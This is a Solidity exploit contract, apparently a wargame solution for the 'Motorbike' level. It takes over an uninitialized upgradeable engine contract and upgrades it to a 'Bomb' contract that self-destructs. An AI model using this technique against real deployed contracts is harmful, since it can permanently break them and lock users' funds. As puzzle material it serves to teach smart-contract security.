// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/proxy/Initializable.sol";
import "./Motorbike.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract HackEngine {
    address public originalContract;

    constructor(address _engine) public {
        console.log("consrtuctor HackEngine ... ");
        originalContract = _engine;
    }

    event logEvent(bool, bytes);
    event Check(bool result);

    function attackEngine() external {
        console.log("attack engine ... ");
        (bool success, bytes memory data) = address(originalContract).call(
            abi.encodeWithSignature("initialize()")
        );
        console.log("emit event ... ");
        emit logEvent(success, data);
    }

    function destroyWithBomb() external {
        // pass in a bomb which blows up when initialize is called
        Bomb bomb = new Bomb();
        console.log("destroy with bomb ... ");
        console.log(address(bomb));

        (bool success, bytes memory data) = address(originalContract).call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(bomb),
                abi.encodeWithSignature("initialize()")
            )
        );
        // Address.functionCall(
        //     originalContract,
        //     abi.encodeWithSignature(
        //         "upgradeToAndCall(address,bytes)",
        //         address(bomb),
        //         abi.encodeWithSignature("initialize()")
        //     )
        // );
        console.log(success);
        console.logBytes(data);
    }

    function validateItIsBroken() external {
        emit Check(Address.isContract(originalContract));
        console.log(Address.isContract(originalContract));
    }
}

contract Bomb {
    function initialize() external {
        console.log("in the bomb ...");
        selfdestruct(msg.sender);
    }
}
